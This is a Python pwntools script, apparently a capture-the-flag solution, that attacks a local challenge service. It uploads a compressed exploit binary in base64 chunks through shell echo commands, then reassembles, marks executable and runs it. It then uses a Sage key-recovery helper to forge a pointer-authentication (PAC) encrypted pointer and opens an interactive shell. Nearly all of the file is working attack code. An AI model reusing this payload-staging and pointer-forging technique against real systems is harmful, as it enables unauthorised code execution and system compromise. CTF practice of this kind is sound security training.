from pwn import *
from base64 import b64encode
import gzip

context.log_level = 'debug'
conn = remote('0.0.0.0', 1337)
conn.recvuntil(b'$')
conn.sendline(b'cd /home/ctf')

expl = open('./exploit', 'rb').read()
expl = b64encode(gzip.compress(expl)).decode()
chunks = [expl[i:i+128] for i in range(0, len(expl), 128)]

for i, chunk in enumerate(chunks):
    conn.sendline(f'echo -n {chunk} | base64 -d > expl.{i:04}'.encode())

conn.sendline(b'cat expl* > exploit.gz')
conn.sendline(b'gzip -d exploit.gz')
conn.sendline(b'rm expl.*')

conn.sendline(b'chmod +x exploit')

conn.sendline(b'./exploit')
conn.recvuntil(b'enc_hello = ')
enc_hello = conn.recvline().strip()
conn.recvuntil(b'reading pac encryption of ')
to_encrypt = conn.recvuntil(b':', drop=True)

key_recovery = process('./key-recovery.sage')
key_recovery.sendlineafter(b'input an encrypted ptr: ', enc_hello)
key_recovery.sendlineafter(b'input a pointer to encrypt: ', to_encrypt)
enc_ptr = key_recovery.recvline().decode().strip().split('encrypted ptr: ')[1]
conn.sendline(enc_ptr.encode())

conn.interactive()
